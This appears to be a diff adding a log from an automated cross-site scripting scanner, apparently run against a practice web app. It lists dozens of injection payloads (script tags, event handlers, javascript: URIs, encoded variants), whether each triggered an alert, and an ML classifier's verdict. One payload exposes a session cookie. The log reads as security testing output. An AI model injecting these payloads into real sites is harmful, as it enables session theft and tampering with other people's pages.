@@ -1,0 +1,447 @@
+Alert detected: 1
+Unique ID: 02a5bb47-5581-43fa-9510-d9ab0497662c
+Payload: "><script>alert(1)</script>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: No
+ML Analysis: {'is_anomaly': True, 'classification': 'suspicious', 'confidence': 0.9}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 233 -> 235
+
+Unexpected error detected in the page.
+Unique ID: 64a5cfa7-aaca-4149-9412-ab9c3e922db0
+Payload: '><img src=x onerror=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: Yes
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 235 -> 233
+
+Unique ID: a569a2e6-1962-460d-9762-b1e5bbd333d9
+Payload: javascript:alert(1)
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 233 -> 235
+
+Unique ID: 0bb6fb37-b7db-4ced-afe1-75ccbb988d2b
+Payload: " onmouseover=alert(1) x="
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 235 -> 236
+
+Unique ID: cf33f285-eaae-4976-8b84-6da174f1554f
+Payload: ' onfocus=alert(1) autofocus '
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 236 -> 234
+
+Unique ID: a5fd460e-a75f-4e93-8580-7ba8719cb386
+Payload: <svg/onload=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 234 -> 236
+
+Unique ID: 195069ff-a7bc-4cf6-8997-9903bea9e122
+Payload: " autofocus onfocus=alert(1) x="
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 236 -> 233
+
+Unique ID: f029f404-9a04-47dc-b62d-4cfe691e3266
+Payload: http://vulnerable.com/search?q=<script>alert(1)</script>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 233 -> 235
+
+Unique ID: 5a8ec9b9-4e4a-4535-8743-4ffdb770e823
+Payload: " onload=alert(1) "
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 235 -> 239
+
+Unique ID: 09f7e8cb-5667-4346-8ec8-2766e0f4def1
+Payload: '><iframe src=javascript:alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 239 -> 234
+
+Unique ID: c5410b1f-cd5c-4892-af4d-3b0da897e407
+Payload: "><body onload=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Unique ID: 3609b065-d9ba-44f9-81ae-a2ddbc402c5f
+Payload: %22%3E%3Cscript%3Ealert(1)%3C/script%3E (URL-encoded)
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: No
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 234 -> 235
+
+Unexpected error detected in the page.
+Unique ID: 8d8cf33e-ce9b-4242-b62e-b3a6b6c3a727
+Payload: '><audio src=x onerror=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: Yes
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 235 -> 234
+
+Unexpected error detected in the page.
+Unique ID: 94385687-6a44-4d12-b2ff-d34c86413ebc
+Payload: "><video><source onerror=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: Yes
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 234 -> 235
+
+Unique ID: 3514d763-01e8-446c-89df-c8b222b23bcf
+Payload: '><details open ontoggle=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 235 -> 230
+
+Unique ID: a58760e2-3976-40c5-b444-970a96575946
+Payload: "><marquee onstart=alert(1)>
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 230 -> 235
+
+Unique ID: 98224c10-fe91-401b-9c8c-89bc08f69aa0
+Payload: '><keygen autofocus onfocus=alert(1)>
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 235 -> 239
+
+Unique ID: 9d802f1e-cc9b-40f4-b1bf-3078164c1dc9
+Payload: "><style onload=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 239 -> 230
+
+Unique ID: 0cd29e6e-5d74-410e-b85e-4b975910df3d
+Payload: '><template onload=alert(1)>
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 230 -> 234
+
+Unique ID: 5acf0ab6-cba0-4929-909c-4b109b311254
+Payload: "><embed src=javascript:alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: PHPSESSID=t2ld8f02c0udt687jkivpcpum5; security=low
+Word count changed: 234 -> 233
+
+Unique ID: c5887f8b-4e3b-4ec3-9dbc-380150c82cf3
+Payload: <script>alert(document.cookie)</script>
+Response Code: 200
+Alert Detected: PHPSESSID=t2ld8f02c0udt687jkivpcpum5; security=low
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 233 -> 235
+
+Unexpected error detected in the page.
+Unique ID: 87ea2a2d-9068-4416-ab7f-a0ce0d66a838
+Payload: <img src=x onerror=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: Yes
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 235 -> 234
+
+Unique ID: 28bdf707-e850-4d81-9103-7e7f818ee332
+Payload: <svg/onload=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Unique ID: 828ff05d-a796-4105-8dcd-0583eebbb1cd
+Payload: <body onload=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: No
+ML Analysis: {'is_anomaly': True, 'classification': 'suspicious', 'confidence': 0.9}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 234 -> 239
+
+Unique ID: ebaf5182-cb48-41bf-8374-6a5b77163abf
+Payload: <iframe src="javascript:alert(1)">
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 239 -> 234
+
+Unique ID: a31f121e-9457-41c2-b3a7-cbef908f7e24
+Payload: <a href="javascript:alert(1)">Click</a>
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Unique ID: 2c21160b-9fb9-487c-9325-08ea2ab4d04e
+Payload: <div onmouseover=alert(1)>Hover</div>
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: No
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 234 -> 236
+
+Unique ID: 9cdc8a30-1a14-43b5-a228-47b0112298c7
+Payload: <input type="text" onfocus=alert(1) autofocus>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 236 -> 234
+
+Unexpected error detected in the page.
+Unique ID: dd351aac-9738-49ed-95e6-4e1aabb730bb
+Payload: <video><source onerror=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: Yes
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 234 -> 230
+
+Unique ID: adc8c02a-0fc9-4af9-9c88-8e749695e75d
+Payload: <marquee onstart=alert(1)>
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 230 -> 235
+
+Unique ID: 925d91db-432f-45c6-8a1f-a420ea2d358e
+Payload: <details open ontoggle=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 235 -> 233
+
+Unique ID: 367f4d23-024e-41b0-bedb-a73959f0b962
+Payload: <script>alert(1)</script>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 233 -> 235
+
+Unexpected error detected in the page.
+Unique ID: 562637d0-985a-44a8-b17c-4b535019a14f
+Payload: <audio src=x onerror=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: Yes
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Unique ID: 93c8895f-605f-41de-a30b-559f43667b25
+Payload: <form onsubmit=alert(1)><input type=submit>
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: No
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Unique ID: 953dfc38-e9ff-479c-8e57-dd581f014f1d
+Payload: <keygen autofocus onfocus=alert(1)>
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: No
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 235 -> 234
+
+Unique ID: 679eb18e-7da2-48f6-b082-6ba205d548b6
+Payload: <select onchange=alert(1)><option>1<option>2</select>
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 234 -> 239
+
+Unique ID: 3d0e62cb-89c4-4a3f-b88a-2ae3249f64b9
+Payload: <style onload=alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 0
+Word count changed: 239 -> 233
+
+Unique ID: 37f53e0a-4608-4864-9e8e-b7d759c35941
+Payload: <script>alert(0)</script>
+Response Code: 200
+Alert Detected: 0
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 233 -> 230
+
+Unique ID: ae6b4f57-5385-4759-8585-a20d06bb2012
+Payload: <object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Alert detected: 1
+Word count changed: 230 -> 234
+
+Unique ID: e6439003-7f0f-4d30-b2e5-dd9befc03486
+Payload: <embed src=javascript:alert(1)>
+Response Code: 200
+Alert Detected: 1
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'suspicious', 'confidence': 1.0}
+--------------------------------------------------
+Unique ID: d4c5675f-b1b0-47a9-bc44-2dde26127ab4
+Payload: <base href="javascript:alert(1)//">
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: No
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 234 -> 230
+
+Unique ID: ae1d136c-6c46-4db3-b5b6-655c8b7bb961
+Payload: <template onload=alert(1)>
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
+Word count changed: 230 -> 233
+
+Unique ID: d48c8d67-a822-4231-983f-02c750fe9ea5
+Payload: <script>alert(xss)</script>
+Response Code: 200
+Alert Detected: None
+Unexpected Error Detected: No
+Body Word Count Changed: Yes
+ML Analysis: {'is_anomaly': False, 'classification': 'safe', 'confidence': 1.0}
+--------------------------------------------------
